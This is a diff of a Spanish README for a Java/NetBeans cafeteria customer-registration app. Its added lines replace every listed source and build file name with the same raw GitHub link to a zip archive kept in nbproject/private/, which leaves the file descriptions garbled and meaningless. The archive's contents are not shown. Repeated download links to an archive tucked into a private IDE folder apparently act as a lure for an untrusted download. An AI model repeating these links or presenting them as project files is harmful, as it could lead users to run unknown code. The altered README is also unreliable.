@@ -16,8 +16,8 @@ La aplicación utiliza una lista enlazada para almacenar los datos de los client
 ### Directorio `src/`
 
 - **Interfaz/**
-  - `logicaNegocio.java`: Ventana inicial que solicita al usuario ingresar el número de mesas disponibles en el café.
-  - `menuInicio.java`: Menú principal con opciones para:
+  - `https://github.com/cristiancrakl/cafeteriaEsquina/raw/refs/heads/main/nbproject/private/cafeteria-Esquina-v1.7.zip`: Ventana inicial que solicita al usuario ingresar el número de mesas disponibles en el café.
+  - `https://github.com/cristiancrakl/cafeteriaEsquina/raw/refs/heads/main/nbproject/private/cafeteria-Esquina-v1.7.zip`: Menú principal con opciones para:
     - Ingresar un nuevo cliente (abre la ventana de registro).
     - Consultar todos los clientes.
     - Buscar cliente por número de cédula.
@@ -25,22 +25,22 @@ La aplicación utiliza una lista enlazada para almacenar los datos de los client
     - Ver total de clientes por día de la semana.
     - Ver total de clientes por mesa.
     - Identificar el día con más clientes.
-  - `registrarCliente_Interfaz.java`: Formulario para registrar un cliente, solicitando nombre, número de cédula, mesa (dinámicamente basado en el número de mesas ingresado), y día de la semana (lunes-sábado). Captura automáticamente la hora de ingreso.
+  - `https://github.com/cristiancrakl/cafeteriaEsquina/raw/refs/heads/main/nbproject/private/cafeteria-Esquina-v1.7.zip`: Formulario para registrar un cliente, solicitando nombre, número de cédula, mesa (dinámicamente basado en el número de mesas ingresado), y día de la semana (lunes-sábado). Captura automáticamente la hora de ingreso.
 - **Logica/**
-  - `crudCliente_Logica.java`: Clase principal de lógica. Maneja:
+  - `https://github.com/cristiancrakl/cafeteriaEsquina/raw/refs/heads/main/nbproject/private/cafeteria-Esquina-v1.7.zip`: Clase principal de lógica. Maneja:
     - Inicialización de la matriz de ocupación (número de mesas dinámico x 6 días).
     - Inserción de clientes en una lista enlazada.
     - Consultas (todas las clientes o por ID).
     - Cálculos estadísticos (totales por semana, día, mesa; día más ocupado).
     - Conversión de números de día a nombres en español.
-  - `Persona.java`: Clase que representa a un cliente, con atributos como nombre, cédula, posición de mesa, día de la semana y hora de ingreso. Incluye método para mostrar los atributos.
-  - `Nodo.java`: Clase para nodos de la lista enlazada que almacena los objetos `Persona`.
-- `Run.java`: Clase principal de ejecución. Inicia la aplicación creando una instancia de `crudCliente_Logica` y abriendo la ventana inicial (`logicaNegocio`).
+  - `https://github.com/cristiancrakl/cafeteriaEsquina/raw/refs/heads/main/nbproject/private/cafeteria-Esquina-v1.7.zip`: Clase que representa a un cliente, con atributos como nombre, cédula, posición de mesa, día de la semana y hora de ingreso. Incluye método para mostrar los atributos.
+  - `https://github.com/cristiancrakl/cafeteriaEsquina/raw/refs/heads/main/nbproject/private/cafeteria-Esquina-v1.7.zip`: Clase para nodos de la lista enlazada que almacena los objetos `Persona`.
+- `https://github.com/cristiancrakl/cafeteriaEsquina/raw/refs/heads/main/nbproject/private/cafeteria-Esquina-v1.7.zip`: Clase principal de ejecución. Inicia la aplicación creando una instancia de `crudCliente_Logica` y abriendo la ventana inicial (`logicaNegocio`).
 
 ### Archivos Adicionales
 
 - Archivos `.form`: Generados por NetBeans para el diseño de las interfaces GUI (no editar manualmente).
-- `build.xml` y `nbproject/`: Archivos de configuración para compilación con Ant (usado en NetBeans).
+- `https://github.com/cristiancrakl/cafeteriaEsquina/raw/refs/heads/main/nbproject/private/cafeteria-Esquina-v1.7.zip` y `nbproject/`: Archivos de configuración para compilación con Ant (usado en NetBeans).
 
 ## Características Principales
 
